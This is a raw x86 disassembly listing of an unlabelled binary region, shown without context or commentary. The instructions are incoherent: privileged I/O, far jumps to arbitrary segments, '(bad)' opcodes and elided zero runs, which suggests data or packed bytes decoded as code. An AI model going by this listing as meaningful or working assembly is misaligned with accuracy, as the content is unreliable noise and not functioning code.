  416f3b:	aaa    
  416f3c:	call   0xe0bd6a47
  416f41:	es gs jb 0x416f8e
  416f45:	xchg   BYTE PTR [esi-0x189718f2],bl
  416f4b:	retf   0xfcba
  416f4e:	inc    ebp
  416f4f:	and    DWORD PTR [eax-0x58],esi
  416f52:	pop    ebx
  416f53:	mov    ebx,0x570825bc
  416f58:	and    eax,0x2844242
  416f5d:	fnstcw WORD PTR [ecx]
  416f5f:	daa    
  416f60:	push   esp
  416f61:	in     al,dx
  416f62:	shr    ecx,cl
  416f64:	mov    ebx,ebx
  416f66:	xor    ebp,DWORD PTR [esi]
  416f68:	or     al,BYTE PTR [ecx+0x54670ed0]
  416f6e:	dec    esi
  416f6f:	push   es
  416f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f71:	addr16 jmp 0xab4c1b06
  416f77:	test   ah,0xce
  416f7a:	sub    BYTE PTR [ebx+0x41],ah
  416f7d:	pop    edx
  416f7e:	clc    
  416f7f:	dec    BYTE PTR [ebp-0x31c0f882]
  416f85:	dec    ebp
  416f86:	or     al,0x2b
  416f88:	cmp    al,0xff
  416f8a:	xchg   esp,eax
  416f8b:	outs   dx,BYTE PTR ds:[esi]
  416f8c:	jo     0x416f5d
  416f8e:	add    BYTE PTR [eax-0x304dab5a],ah
  416f94:	mov    cl,0x37
  416f96:	fs push ds
  416f98:	sub    DWORD PTR [ebx+0x43],ebx
  416f9b:	repnz mov ecx,0x5d4c9f19
  416fa1:	dec    ebx
  416fa2:	aad    0xff
  416fa4:	inc    edi
  416fa5:	sub    al,0xd3
  416fa7:	adc    esp,DWORD PTR [ebx]
  416fa9:	shr    DWORD PTR [ebx+0x226428cc],cl
  416faf:	das    
  416fb0:	jae    0x41700e
  416fb2:	adc    BYTE PTR [edx-0x1a],ah
  416fb5:	stc    
  416fb6:	stc    
  416fb7:	sbb    BYTE PTR [esp+eax*4+0x201063ca],dl
  416fbe:	sub    ebp,esp
  416fc0:	in     al,dx
  416fc1:	into   
  416fc2:	lock mov ds:0x342ad69d,al
  416fc8:	adc    eax,0x1460e2a0
  416fcd:	and    DWORD PTR [esi],esp
  416fcf:	xchg   edx,eax
  416fd0:	push   edi
  416fd1:	shl    BYTE PTR [eax-0x48],0x8b
  416fd5:	lds    esi,FWORD PTR [ebx-0x14b89a8f]
  416fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fdc:	stos   BYTE PTR es:[edi],al
  416fdd:	je     0x416ff2
  416fdf:	outs   dx,BYTE PTR ds:[esi]
  416fe0:	push   0xffffffc4
  416fe2:	into   
  416fe3:	fcom   DWORD PTR [esi-0x1a]
  416fe6:	addr16 sti 
  416fe8:	push   esi
  416fe9:	push   esi
  416fea:	in     al,0xab
  416fec:	inc    esi
  416fed:	push   edi
  416fee:	push   cs
  416fef:	shl    DWORD PTR [esi+esi*1],0x4b
  416ff3:	dec    ecx
  416ff4:	scas   al,BYTE PTR es:[edi]
  416ff5:	xlat   BYTE PTR ds:[ebx]
  416ff6:	mov    esp,0xcf719fde
  416ffb:	jmp    0x10b3:0x9c2645f5
  417002:	scas   al,BYTE PTR es:[edi]
  417003:	mov    esi,0x9a83788e
  417008:	fstp   DWORD PTR [edi]
  41700a:	xor    DWORD PTR [edx],ebp
  41700c:	jecxz  0x416fd4
  41700e:	aad    0x53
  417010:	rol    BYTE PTR [eax],cl
	...
  417072:	add    BYTE PTR [eax],al
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebx,eax
  417081:	mov    bh,0x95
  417083:	aaa    
  417084:	xor    ebx,0x1050000
  41708a:	add    BYTE PTR [eax],al
  41708c:	fldenv [ecx+0x5e]
  41708f:	dec    edx
  417090:	xor    dh,BYTE PTR [ebp+eiz*2-0xb]
  417094:	and    al,0xc5
  417096:	xor    BYTE PTR [ebx],cl
  417098:	addr16 nop
  41709a:	jmp    0x70eb:0xcac0a262
  4170a1:	push   cs
  4170a2:	mov    edx,0x8fd33370
  4170a7:	daa    
  4170a8:	pop    eax
  4170a9:	adc    ecx,DWORD PTR [edi]
  4170ab:	sub    ch,dh
  4170ad:	outs   dx,DWORD PTR ds:[esi]
  4170ae:	xor    al,0x8a
  4170b0:	mov    edi,0x79ee6ba1
  4170b5:	xchg   edx,eax
  4170b6:	inc    eax
  4170b7:	shr    edx,1
  4170b9:	and    esp,ebp
  4170bb:	jb     0x4170f9
  4170bd:	lock inc esp
  4170bf:	out    0x71,eax
  4170c1:	pop    ebp
  4170c2:	fld    DWORD PTR [ebx-0x3476bc3f]
  4170c8:	inc    edx
  4170c9:	lea    edi,[ebx-0x357817]
  4170cf:	cmp    eax,DWORD PTR [ebx+0x3e89a34a]
  4170d5:	push   eax
  4170d6:	gs jb  0x4170c4
  4170d9:	adc    eax,0x36bcf6aa
  4170de:	cmp    eax,0x3c4e81ab
  4170e3:	mov    ecx,0xee275f6e
  4170e8:	shl    BYTE PTR [edx+edx*4+0x2cfaf2e4],0x8a
  4170f0:	rcr    DWORD PTR [eax+0x31],cl
  4170f3:	pop    edx
  4170f4:	mov    eax,ds:0xf9f2045
  4170f9:	cmp    eax,0xcdaaf198
  4170fe:	rol    DWORD PTR [eax+eiz*4],0x75
  417102:	and    ebp,DWORD PTR [edx+0x6ce3d676]
  417108:	popa   
  417109:	sbb    dl,BYTE PTR [edx+0x6c]
  41710c:	inc    ebx
  41710d:	pop    esp
  41710e:	out    dx,eax
  41710f:	in     eax,dx
  417110:	cmp    eax,0xe6e8e62a
  417115:	sbb    BYTE PTR [eax],cl
  417117:	jge    0x417179
  417119:	cmp    dl,BYTE PTR [ecx+0x3c4f6d]
  41711f:	ds repz repz into 
  417123:	dec    ebp
  417124:	shr    esi,0x7d
  417127:	les    ecx,FWORD PTR [edx-0x6]
  41712a:	call   0x27a054b7
  41712f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417130:	fistp  WORD PTR [ebp+ebx*2-0x69]
  417134:	dec    esi
  417135:	out    0x4c,al
  417137:	je     0x41711b
  417139:	(bad)  
  41713a:	pop    esi
  41713b:	hlt    
  41713c:	push   0x1d
  41713e:	mov    ch,0x9
  417140:	outs   dx,BYTE PTR ds:[esi]
  417141:	sar    DWORD PTR [ecx+ebp*2+0x30],cl
  417145:	inc    ebp
  417146:	mov    ebx,0x2bd5a16e
  41714b:	imul   DWORD PTR [eax]
  41714d:	push   esp
  41714e:	fmulp  st(5),st
  417150:	xor    edi,DWORD PTR [ecx+0x497dbae7]
  417156:	xor    al,0x10
  417158:	jae    0x417195
  41715a:	pop    esp
  41715b:	ja     0x4170f9
  41715d:	sub    edi,DWORD PTR gs:[ebx+edi*1+0x40c26c26]
  417165:	inc    esi
  417166:	aaa    
  417167:	dec    BYTE PTR [edi+edx*8]
  41716a:	jae    0x4170f8
  41716c:	inc    ebp
  41716d:	nop
  41716e:	or     eax,0xf0e42037
  417173:	jmp    FWORD PTR [ecx]
  417175:	adc    esi,edx
  417177:	xchg   DWORD PTR [eax],edi
  417179:	cwde   
  41717a:	sub    al,0x2b
  41717c:	sbb    esp,DWORD PTR [ebx]
  41717e:	xchg   ecx,eax
  41717f:	mov    ss:0x9d3140eb,eax
  417185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417186:	cmp    eax,0xe81a0d0f
  41718b:	jge    0x417192
  41718d:	sub    esp,eax
  41718f:	shl    BYTE PTR ds:0x0,0x0
	...
  4171f2:	add    BYTE PTR [eax],al
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417201:	xchg   edx,eax
  417202:	push   ebx
  417203:	push   0xffffff86
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0xfc000001
  41720d:	and    BYTE PTR [edx],bh
  41720f:	mov    dh,0x38
  417211:	std    
  417212:	cli    
  417213:	mov    bh,0x8c
  417215:	xlat   BYTE PTR ds:[ebx]
  417216:	inc    esi
  417217:	ds pop esi
  417219:	and    al,0x56
  41721b:	pop    ebx
  41721c:	cmp    al,0x5
  41721e:	out    dx,eax
  41721f:	mov    bh,0x9e
  417221:	fidiv  DWORD PTR [esi+edx*1]
  417224:	shl    BYTE PTR [eax-0x68255016],0x90
  41722b:	pop    eax
  41722c:	aas    
  41722d:	cs dec edx
  41722f:	daa    
  417230:	and    al,0x69
  417232:	and    BYTE PTR [ebx+0xd54fbfe],0x4
  417239:	xor    eax,0x7a5c6684
  41723e:	adc    BYTE PTR [esi],dh
  417240:	pop    esp
  417241:	inc    esp
  417242:	pop    ebp
  417243:	jmp    0xca7327d5
  417248:	in     eax,0x7c
  41724a:	xchg   edi,eax
  41724b:	shr    BYTE PTR [ebp+0x1b],1
  41724e:	push   es
  41724f:	sbb    eax,ebp
  417251:	sub    BYTE PTR ds:[ecx],dh
  417254:	pusha  
  417255:	out    dx,al
  417256:	hlt    
  417257:	jae    0x4172cb
  417259:	or     BYTE PTR [ebx-0x13],0x54
  41725d:	pop    ebp
  41725e:	loope  0x41729d
  417260:	jmp    0x475d:0x2669088d
  417267:	arpl   WORD PTR [esi-0x2f],ax
  41726a:	push   0xffffffb2
  41726c:	xlat   BYTE PTR ds:[ebx]
  41726d:	leave  
  41726e:	mov    es,WORD PTR [esi-0x63d6dff6]
  417274:	inc    ecx
  417275:	stc    
  417276:	loopne 0x417248
  417278:	add    ebp,esi
  41727a:	loopne 0x417280
  41727c:	lahf   
  41727d:	test   BYTE PTR ds:0x4d3d,al
  417282:	lea    ebp,[edx]
  417284:	push   0xffffff8f
  417286:	inc    eax
  417287:	pop    edx
  417288:	out    0xbd,eax
  41728a:	bnd ret 0x4201
  41728e:	scas   al,BYTE PTR es:[edi]
  41728f:	aas    
  417290:	mov    bl,0x20
  417292:	cmp    al,0x5f
  417294:	mov    al,0x21
  417296:	cmp    eax,0x8de1c566
  41729b:	sbb    ecx,DWORD PTR [edx]
  41729d:	out    0xd1,eax
  41729f:	push   ebx
  4172a0:	minps  xmm1,xmm2
  4172a3:	das    
  4172a4:	mov    edx,0x7dddd488
  4172a9:	mov    dh,0x11
  4172ab:	stc    
  4172ac:	mul    esi
  4172ae:	test   BYTE PTR [ebp-0x45],al
  4172b1:	xchg   ebx,eax
  4172b2:	and    ch,BYTE PTR [edx+ebp*8]
  4172b5:	and    al,0xbf
  4172b7:	es loopne 0x417291
  4172ba:	mov    ebx,0x9702fe10
  4172bf:	mov    ds:0x4c57e095,eax
  4172c4:	add    DWORD PTR [edi+0x70aa658b],eax
  4172ca:	fwait
  4172cb:	mov    ds:0x9807ec6f,eax
  4172d0:	jnp    0x4172be
  4172d2:	xchg   BYTE PTR [ebp+0x2],cl
  4172d5:	xlat   BYTE PTR ds:[ebx]
  4172d6:	out    dx,eax
  4172d7:	jo     0x417278
  4172d9:	inc    edx
  4172da:	sub    eax,0x19d7114
  4172df:	mov    edx,0x1c322e00
  4172e4:	call   0xbba86513
  4172e9:	push   ebx
  4172ea:	xor    BYTE PTR ds:0x1c9bdd43,dh
  4172f0:	mov    eax,0xe0122c10
  4172f5:	mov    al,0xb4
  4172f7:	or     ebp,esp
  4172f9:	mov    al,0x9e
  4172fb:	sub    eax,0x367cba21
  417300:	jae    0x41728c
  417302:	sub    eax,0x94bad144
  417307:	pop    es
  417308:	arpl   WORD PTR [edx-0x57],ax
  41730b:	and    eax,0x91970e37
  417310:	inc    ebx
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	mov    esi,DWORD PTR [eax-0x4e]
  417383:	clc    
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x32000001
  41738d:	add    edi,DWORD PTR [edi-0x28c34e77]
  417393:	xchg   ebp,eax
  417394:	jmp    0x4173c9
  417396:	mov    bh,0x46
  417398:	sub    BYTE PTR es:[edx+0x68a3522e],0x67
  4173a0:	popf   
  4173a1:	aam    0x22
  4173a3:	mov    al,0xae
  4173a5:	aas    
  4173a6:	gs xchg esi,eax
  4173a8:	mov    ah,BYTE PTR [ebx+ebx*8-0x66]
  4173ac:	js     0x417351
  4173ae:	inc    ebx
  4173af:	imul   edx,DWORD PTR [ebp-0x158c772],0xffffff9b
  4173b6:	adc    al,0xb4
  4173b8:	mov    ecx,0x919093bf
  4173bd:	push   ebx
  4173be:	in     eax,dx
  4173bf:	fwait
  4173c0:	iret   
  4173c1:	retf   
  4173c2:	cli    
  4173c3:	in     al,0xd5
  4173c5:	mov    BYTE PTR [edx+0x3d071299],bl
  4173cb:	std    
  4173cc:	sbb    al,0xb8
  4173ce:	cli    
  4173cf:	out    0x34,al
  4173d1:	add    edx,DWORD PTR [eax]
  4173d3:	fisub  WORD PTR [edx+0x3b6f15bd]
  4173d9:	add    esp,DWORD PTR [esi+esi*1+0x83c9791]
  4173e0:	sbb    ebx,edx
  4173e2:	mov    WORD PTR [edx],fs
  4173e4:	popa   
  4173e5:	popa   
  4173e6:	mov    dh,dh
  4173e8:	daa    
  4173e9:	add    eax,0x8dc977a0
  4173ee:	imul   edx,DWORD PTR [edi],0x958258dd
  4173f4:	jbe    0x4173d5
  4173f6:	das    
  4173f7:	jle    0x41745a
  4173f9:	fisttp QWORD PTR [esi+0x45]
  4173fc:	loopne 0x4173eb
  4173fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417400:	push   ss
  417401:	mov    eax,0x4b2d21bb
  417406:	rol    edx,cl
  417408:	pop    es
  417409:	(bad)  
  41740a:	cs aad 0xb3
  41740d:	or     BYTE PTR [edx],0x97
  417410:	idiv   ebx
  417412:	inc    esi
  417413:	add    bl,BYTE PTR [ebp+0x48]
  417416:	jmp    0xfc52e159
  41741b:	loopne 0x417478
  41741d:	bound  ebp,QWORD PTR [edi+0x9eecf2a]
  417423:	jge    0x41749b
  417425:	loope  0x4173c9
  417427:	mov    edx,DWORD PTR [esi+0x48e31003]
  41742d:	xor    BYTE PTR ds:0x8d54151c,dh
  417433:	fcomp  st(0)
  417435:	in     eax,dx
  417436:	push   ecx
  417437:	fist   DWORD PTR [esp+ebp*1-0x26f08f42]
  41743e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743f:	inc    eax
  417440:	cli    
  417441:	out    dx,eax
  417442:	add    BYTE PTR [edx-0xd688459],bh
  417448:	jmp    FWORD PTR [ecx]
  41744a:	and    eax,DWORD PTR [edx+0x72]
  41744d:	and    ebx,ebp
  41744f:	out    0xe1,al
  417451:	xor    al,0xa4
  417453:	cmp    dh,ah
  417455:	lea    eax,ds:0x54d95e
  41745b:	dec    esp
  41745c:	ja     0x4173e7
  41745e:	sahf   
  41745f:	dec    ebx
  417460:	dec    esi
  417461:	lahf   
  417462:	mov    bl,0x57
  417464:	ins    BYTE PTR es:[edi],dx
  417465:	ins    DWORD PTR es:[edi],dx
  417466:	pusha  
  417467:	hlt    
  417468:	outs   dx,DWORD PTR ds:[esi]
  417469:	les    esi,FWORD PTR [ebp-0x1d612747]
  41746f:	loope  0x41741f
  417471:	daa    
  417472:	and    DWORD PTR [edi-0x34347491],edx
  417478:	sbb    eax,0x633622b4
  41747d:	inc    esp
  41747e:	mov    ch,0x97
  417480:	enter  0x90ad,0x6a
  417484:	or     ebp,ebx
  417486:	add    al,0xab
  417488:	lock mov dl,0x11
  41748b:	ins    DWORD PTR es:[edi],dx
  41748c:	mov    ds:0x4f53489e,eax
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	and    ebx,esi
  417502:	lahf   
  417503:	jl     0x417495
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0x4d000001
  41750d:	rol    edx,0x4d
  417510:	nop
  417511:	and    bh,BYTE PTR [edx]
  417513:	mov    esp,0xc949483e
  417518:	lea    esp,[eax+0x7011226d]
  41751e:	dec    esi
  41751f:	inc    ebp
  417520:	xor    ch,cl
  417522:	xor    eax,0x137cb229
  417527:	jp     0x4174dd
  417529:	stc    
  41752a:	sub    DWORD PTR ds:[edi],ebx
  41752d:	dec    edi
  41752e:	mov    dh,0x75
  417530:	mov    esi,0xf5363e70
  417535:	jae    0x41750e
  417537:	xor    BYTE PTR [ecx-0x23],ch
  41753a:	or     BYTE PTR [eax+0xd],0x1a
  41753e:	sub    edx,ecx
  417540:	std    
  417541:	js     0x4175b3
  417543:	sub    ah,dl
  417545:	cmp    ah,al
  417547:	loop   0x417548
  417549:	mov    edi,0x920873f4
  41754e:	jne    0x41753d
  417550:	(bad)  
  417551:	iret   
  417552:	inc    esi
  417553:	fldenv [ebx+ebp*1-0x11]
  417557:	mov    bl,0xd
  417559:	push   ds
  41755a:	mov    dh,0x11
  41755c:	loopne 0x41754d
  41755e:	popa   
  41755f:	mov    ds:0x6028222,eax
  417564:	popa   
  417565:	jo     0x417576
  417567:	fstp   TBYTE PTR [ebx]
  417569:	or     ah,bl
  41756b:	xlat   BYTE PTR ds:[ebx]
  41756c:	pop    ebp
  41756d:	lock mov esi,0xc2d358a1
  417573:	jg     0x417584
  417575:	shr    BYTE PTR [ecx+eax*2],cl
  417578:	add    BYTE PTR [ebp-0x71],0x1
  41757c:	or     DWORD PTR [esi+0x16],ebx
  41757f:	bound  esp,QWORD PTR [ecx+0x2f]
  417582:	jns    0x4175c0
  417584:	leave  
  417585:	lahf   
  417586:	sub    BYTE PTR [esi+0x6f],bh
  417589:	push   eax
  41758a:	pop    ss
  41758b:	shl    BYTE PTR [edx],0xa1
  41758e:	ja     0x4175cb
  417590:	outs   dx,BYTE PTR ds:[esi]
  417591:	sbb    al,0x89
  417593:	mov    ebp,0x647830ed
  417598:	sbb    edx,edx
  41759a:	or     al,0xad
  41759c:	sbb    ah,BYTE PTR [esi]
  41759e:	cmc    
  41759f:	ret    0x7cc8
  4175a2:	sbb    DWORD PTR [ebx+0x21bb045b],ebp
  4175a8:	xor    al,dh
  4175aa:	push   ebp
  4175ab:	out    dx,eax
  4175ac:	outs   dx,DWORD PTR ds:[esi]
  4175ad:	xchg   DWORD PTR [ebx+0x23],esp
  4175b0:	mov    edx,0x36965fe3
  4175b5:	add    eax,0xf5a5f900
  4175ba:	dec    ebp
  4175bb:	aas    
  4175bc:	out    0x20,al
  4175be:	ss mov bl,0x2b
  4175c1:	mov    esi,0xb686afc1
  4175c6:	sti    
  4175c7:	leave  
  4175c8:	ins    DWORD PTR es:[edi],dx
  4175c9:	stc    
  4175ca:	add    bh,al
  4175cc:	adc    al,0x9f
  4175ce:	in     eax,dx
  4175cf:	add    eax,0x4c1c3f6b
  4175d4:	push   0xa45649d4
  4175d9:	lds    ebx,FWORD PTR [ecx]
  4175db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175dc:	xor    eax,0xa7041859
  4175e1:	and    eax,0x6256d853
  4175e6:	xor    DWORD PTR [ebp+0x59a80ba6],esp
  4175ec:	sbb    BYTE PTR [edx+0x595f0705],cl
  4175f2:	pusha  
  4175f3:	pop    esp
  4175f4:	dec    esi
  4175f5:	adc    al,0x16
  4175f7:	mov    ecx,0xddcfa1dd
  4175fc:	scas   eax,DWORD PTR es:[edi]
  4175fd:	adc    DWORD PTR [ebx+0x77074d6c],0xa4a4952a
  417607:	imul   ebp,DWORD PTR [eax+0x35],0xb8e2524f
  41760e:	pushf  
  41760f:	and    edx,DWORD PTR [eax+0x0]
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	(bad)  
  417681:	or     edi,esi
  417683:	enter  0xf795,0x0
  417687:	add    BYTE PTR ds:0x33000001,al
  41768d:	and    al,0xce
  41768f:	test   bl,ch
  417691:	cmp    BYTE PTR [ecx+0x45],bl
  417694:	mov    ds:0x27812b66,al
  417699:	ins    BYTE PTR es:[edi],dx
  41769a:	mov    dh,BYTE PTR [esi+0xf320850]
  4176a0:	arpl   WORD PTR [ebx],si
  4176a2:	popf   
  4176a3:	or     al,0x16
  4176a5:	loope  0x41763e
  4176a7:	mov    esp,0x8f1fa708
  4176ac:	jmp    0x852:0x21b3c7e6
  4176b3:	retf   
  4176b4:	and    ecx,ecx
  4176b6:	test   DWORD PTR [edi+0x7a],ecx
  4176b9:	int3   
  4176ba:	mov    ebx,0xaa829e6b
  4176bf:	loop   0x41764f
  4176c1:	mov    edi,0xf8020d12
  4176c6:	repz js 0x417688
  4176c9:	xor    DWORD PTR [esi-0x7f6c8d7d],eax
  4176cf:	jo     0x41773f
  4176d1:	or     DWORD PTR [ebp+ecx*2-0x31],esi
  4176d5:	xor    BYTE PTR ds:0x1b68e1c8,bl
  4176db:	pop    ds
  4176dc:	mov    ah,0x7e
  4176de:	pslld  mm5,QWORD PTR [edi+0x36]
  4176e2:	rcr    DWORD PTR [esi-0x54],cl
  4176e5:	pop    ebx
  4176e6:	iret   
  4176e7:	rol    DWORD PTR [ecx-0x25c86d18],1
  4176ed:	or     DWORD PTR [ecx-0x426ecacb],esi
  4176f3:	add    BYTE PTR [eax*4-0x55c9aabf],0xd
  4176fb:	adc    eax,0x12c3333a
  417700:	add    al,BYTE PTR [eax]
  417702:	fcomp  DWORD PTR [eax]
  417704:	mov    esp,0x7c3fa6f3
  417709:	xlat   BYTE PTR ds:[ebx]
  41770a:	imul   ebp,DWORD PTR [eax+0xf],0x8d738545
  417711:	mov    al,0x42
  417713:	gs in  al,0x7
  417716:	(bad)  
  417718:	mov    eax,ds:0xd180bf3a
  41771d:	mov    al,0x67
  41771f:	push   0x782d0108
  417724:	inc    esi
  417725:	(bad)  
  417726:	aam    0xda
  417728:	cs xchg BYTE PTR cs:[eax-0x2d],bl
  41772d:	push   ds
  41772e:	lahf   
  41772f:	stos   BYTE PTR es:[edi],al
  417730:	jmp    0x41772e
  417732:	xchg   esp,eax
  417733:	adc    eax,0x2e608618
  417738:	popf   
  417739:	xor    DWORD PTR [ecx+ebp*1],edi
  41773c:	pop    es
  41773d:	mov    edi,0xd462d9a9
  417742:	jp     0x41770f
  417744:	gs ss push cs
  417747:	mov    ch,0x81
  417749:	and    eax,0x3eb920c0
  41774e:	push   cs
  41774f:	loope  0x417731
  417751:	add    eax,0x7e9c3bdd
  417756:	or     ebp,DWORD PTR [ecx]
  417758:	or     BYTE PTR [ecx],dl
  41775a:	aam    0xcf
  41775c:	mov    bl,0xd2
  41775e:	add    BYTE PTR [ebp+0x13251ca1],cl
  417764:	jmp    0xe29f2e91
  417769:	idiv   DWORD PTR ds:0x4e5f9df6
  41776f:	arpl   WORD PTR [ecx],sp
  417771:	ins    DWORD PTR es:[edi],dx
  417772:	test   BYTE PTR [edi],0xe6
  417775:	pushf  
  417776:	in     eax,dx
  417777:	in     al,0xe0
  417779:	add    BYTE PTR ds:0xe9140d8,ah
  41777f:	push   edx
  417780:	mov    edi,0x970fd04a
  417785:	sbb    eax,0xf35c199f
  41778a:	jle    0x4177b3
  41778c:	int3   
  41778d:	adc    al,0x52
  41778f:	stc    
  417790:	jmp    0x417792
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	add    eax,DWORD PTR [edi]
  417802:	jne    0x41786e
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [ebp-0x3c703e55],dh
  417811:	cmp    dl,BYTE PTR [edi+0x74117c81]
  417817:	fwait
  417818:	data16 or dh,al
  41781b:	adc    edx,ebp
  41781d:	sbb    cl,bh
  41781f:	lods   al,BYTE PTR ds:[esi]
  417820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417821:	in     eax,0xd8
  417823:	push   es
  417824:	scas   eax,DWORD PTR es:[edi]
  417825:	fwait
  417826:	push   edi
  417827:	push   ss
  417828:	push   ebp
  417829:	sbb    ah,BYTE PTR [esi]
  41782b:	loop   0x4177ad
  41782d:	cmp    dh,BYTE PTR [ecx-0x28]
  417830:	xor    DWORD PTR [edx+0x7a04e877],ebx
  417836:	and    eax,DWORD PTR ds:[eax+0x69a95693]
  41783d:	shr    DWORD PTR [esi-0x537c44d5],cl
  417843:	retf   
  417844:	dec    ebx
  417845:	inc    eax
  417846:	inc    esi
  417847:	rol    BYTE PTR [esi-0x1a],0x13
  41784b:	lock jno 0x417896
  41784e:	call   0x4bab:0xfda2f04c
  417855:	mov    eax,ds:0x131bf384
  41785a:	(bad)  
  41785b:	retf   
  41785c:	mov    edi,edx
  41785e:	add    eax,0x2452b78
  417863:	lods   al,BYTE PTR ds:[esi]
  417864:	test   BYTE PTR [esi],ah
  417866:	nop
  417867:	int3   
  417868:	mov    fs,esi
  41786a:	rol    DWORD PTR [edi],1
  41786c:	dec    esp
  41786d:	pop    ebp
  41786e:	and    eax,0xa25eb74e
  417873:	add    ebx,DWORD PTR [eax-0xb7859b9]
  417879:	loop   0x417883
  41787b:	pop    edx
  41787c:	mov    ds,WORD PTR [ecx+0x17]
  41787f:	fld    TBYTE PTR [esi]
  417881:	xor    ebx,DWORD PTR [ebx-0x21]
  417884:	ror    DWORD PTR [ebp-0x7d],cl
  417887:	jecxz  0x417888
  417889:	lock hlt 
  41788b:	outs   dx,BYTE PTR ds:[esi]
  41788c:	lods   eax,DWORD PTR ds:[esi]
  41788d:	xchg   edx,eax
  41788e:	and    eax,0xfe21c583
  417893:	xor    eax,0x2dbe8eba
  417898:	mov    DWORD PTR [eax+edi*8],ecx
  41789b:	mov    al,ds:0xd542513c
  4178a0:	ror    BYTE PTR [esi+0x8],0x5e
  4178a4:	ret    
  4178a5:	sub    DWORD PTR [edi-0x19b79279],ebx
  4178ab:	pop    ds
  4178ac:	out    0xb0,eax
  4178ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178af:	adc    al,0x88
  4178b1:	and    ch,BYTE PTR [ecx-0xc906981]
  4178b7:	mov    ebx,0xe2c7d52c
  4178bc:	call   0x157a2a73
  4178c1:	push   esp
  4178c2:	add    esi,ebx
  4178c4:	mov    cl,0xb5
  4178c6:	inc    esi
  4178c7:	jns    0x4178f4
  4178c9:	leave  
  4178ca:	mov    ds:0x839e3611,eax
  4178cf:	ror    DWORD PTR [edi+0x5b],1
  4178d2:	int    0x15
  4178d4:	out    dx,al
  4178d5:	xor    eax,0xf7330d06
  4178da:	xchg   esi,eax
  4178db:	push   ds
  4178dc:	in     al,dx
  4178dd:	xlat   BYTE PTR ds:[ebx]
  4178de:	inc    eax
  4178df:	add    edi,ebx
  4178e1:	es push ebx
  4178e3:	cmp    ah,cl
  4178e5:	out    0xf6,al
  4178e7:	rol    DWORD PTR [ebp+0x3c1783fd],0xaa
  4178ee:	sbb    BYTE PTR [ebx],bl
  4178f0:	mov    esp,0x8ee71c7f
  4178f5:	jmp    0xd2b4:0xcb668a77
  4178fc:	cmc    
  4178fd:	xor    eax,0xb2a33490
  417902:	imul   esi,DWORD PTR [esi-0xe],0x10b1b62e
  417909:	mov    ebp,esp
  41790b:	pusha  
  41790c:	adc    BYTE PTR [ecx+0x80d38],0x0
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	stos   BYTE PTR es:[edi],al
  417981:	jle    0x4179b3
  417983:	jb     0x417924
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0xf7000001
  41798d:	pop    es
  41798e:	push   ss
  41798f:	js     0x417a0d
  417991:	addr16 clc 
  417993:	mov    eax,ds:0xc7502b52
  417998:	xlat   BYTE PTR ds:[ebx]
  417999:	shr    BYTE PTR [eax+esi*1],0x22
  41799d:	xor    al,dh
  41799f:	add    eax,0xf8c3a24e
  4179a4:	popf   
  4179a5:	test   al,0xa7
  4179a7:	xchg   ecx,eax
  4179a8:	push   edx
  4179a9:	add    ch,cl
  4179ab:	fild   DWORD PTR [edx-0x514e75c8]
  4179b1:	(bad)  
  4179b3:	rcl    DWORD PTR [ebx+0x6a5865b4],1
  4179b9:	addr16 pop ebp
  4179bb:	adc    eax,0xb8cffd38
  4179c0:	xchg   ebp,eax
  4179c1:	pop    ebp
  4179c2:	popw   ss
  4179c4:	test   al,0xc0
  4179c6:	ins    BYTE PTR es:[edi],dx
  4179c7:	inc    esp
  4179c8:	mov    bh,0xf6
  4179ca:	sbb    bh,BYTE PTR [eax+0x12]
  4179cd:	dec    esp
  4179ce:	cmp    bh,bh
  4179d0:	push   cs
  4179d1:	call   0x750e:0xdece
  4179d7:	stc    
  4179d8:	(bad)  
  4179d9:	push   eax
  4179da:	and    cl,BYTE PTR [esp+ecx*4+0xa]
  4179de:	std    
  4179df:	jecxz  0x417a28
  4179e1:	add    al,0xf3
  4179e3:	dec    esp
  4179e4:	(bad)  
